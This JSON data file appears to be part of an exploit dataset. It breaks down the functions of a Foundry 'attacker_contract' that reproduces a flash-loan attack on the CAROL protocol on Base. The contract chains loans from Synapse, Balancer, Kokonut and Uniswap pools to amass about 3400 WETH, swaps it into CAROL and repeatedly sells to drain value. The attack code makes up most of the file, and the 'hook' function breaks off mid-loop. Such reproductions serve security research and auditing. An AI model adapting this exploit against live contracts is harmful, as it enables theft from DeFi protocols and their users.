[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address sender,\n        address underlying,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata params\n    ) external {\n        // Flashloan WETH from Balancer\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = WETH.balanceOf(address(BalancerVault));\n        BalancerVault.flashLoan(address(this), tokens, amounts, bytes(\"\"));\n        WETH.transfer(address(SynapseETHPools), amount + fee);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "hook",
    "original_code": "    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        emit log_named_decimal_uint(\"WETH amount after flashloans\", WETH.balanceOf(address(this)), 18);\n        // Swap all WETH to CAROL\n        WETH.approve(address(Router), type(uint256).max);\n        CAROL.approve(address(Router), type(uint256).max);\n        WETHToCAROL();\n        emit log_named_decimal_uint(\n            \"CAROL amount after swap from WETH\", CAROL.balanceOf(address(this)), CAROL.decimals()\n        );\n\n        uint256 sellAmount = CAROLProtocol.userBalance(address(this));\n        uint256 i;\n        while (i < 1000) {\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "onFlashLoan",
    "original_code": "    function onFlashLoan(\n        address initiator,\n        uint256[] calldata amounts,\n        uint256[] calldata fees,\n        bytes calldata data\n    ) external {\n        // Flashloan WETH from UniswapV3 pool\n        bytes memory data = abi.encode(uint256(WETH.balanceOf(address(WETH_USDbCV3))));\n        WETH_USDbCV3.flash(address(this), WETH.balanceOf(address(WETH_USDbCV3)), 0, data);\n        WETH.transfer(address(Kokonut), amounts[1] + fees[1]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        // Flashloan WETH from Kokonut\n        uint256[] memory tokenAmounts = new uint256[](2);\n        tokenAmounts[0] = 0;\n        tokenAmounts[1] = WETH.balanceOf(address(Kokonut));\n        Kokonut.flashLoan(address(this), tokenAmounts, bytes(\"\"));\n        WETH.transfer(msg.sender, amounts[0]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"Base\", blocknumToForkFrom);\n        vm.label(address(CAROLProtocol), \"CAROLProtocol\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(SynapseETHPools), \"SynapseETHPools\");\n        vm.label(address(BalancerVault), \"BalancerVault\");\n        vm.label(address(Kokonut), \"Kokonut\");\n        vm.label(address(WETH_USDbCV3), \"WETH_USDbCV3\");\n        vm.label(address(WETH_USDbCV2), \"WETH_USDbCV2\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(CAROL), \"CAROL\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Prepare tx:\n        // Start with following ETH balance\n        deal(address(this), 0.07 ether);\n        emit log_named_decimal_uint(\"Exploiter ETH balance before attack\", address(this).balance, 18);\n        // Buy CAROL tokens with ETH through bonding. Create active 'Bond'\n        CAROLProtocol.buy{value: 0.03 ether}(address(this), 0);\n        // Use remaining ETH and CAROL tokens from active 'Bond' for liquidity staking in WETH_CAROL pair\n        CAROLProtocol.stake{value: 0.039 ether}(0);\n\n        // Attack tx:\n        vm.roll(block.number + 33_719);\n        // Adjusted time. Without following line, output from ICAROLProtocol.userBalance(userAddress) will be 0\n        // in later time. This is wrong.\n        vm.warp(block.timestamp + 18 hours + 39 minutes - 2 seconds);\n\n        // Flashloan WETH from Synapse\n        SynapseETHPools.flashLoan(address(this), address(WETH), WETH.balanceOf(address(SynapseETHPools)), bytes(\"\"));\n\n        withdrawingWETH = true;\n        WETH.withdraw(WETH.balanceOf(address(this)));\n\n        emit log_named_decimal_uint(\"Exploiter ETH balance after attack\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        uint256 repayAmount = abi.decode(data, (uint256));\n        // Following value comes from data parameter in attack tx\n        // The total amount of WETH should be this much after flashloans\n        uint256 totalAmountOfWETH = 3400e18;\n        uint256 amount0Out = totalAmountOfWETH - (WETH.balanceOf(address(this)));\n        // Borrow additional WETH amount\n        WETH_USDbCV2.swap(amount0Out, 0, address(this), abi.encodePacked(uint8(1)));\n        WETH.transfer(address(WETH_USDbCV3), repayAmount + fee0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICAROLProtocol",
    "source_type": "victim_contract",
    "function_name": "bonds",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICAROLProtocol",
    "source_type": "victim_contract",
    "function_name": "buy",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICAROLProtocol",
    "source_type": "victim_contract",
    "function_name": "sell",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICAROLProtocol",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICAROLProtocol",
    "source_type": "victim_contract",
    "function_name": "userBalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ISynapseETHPools",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  }
]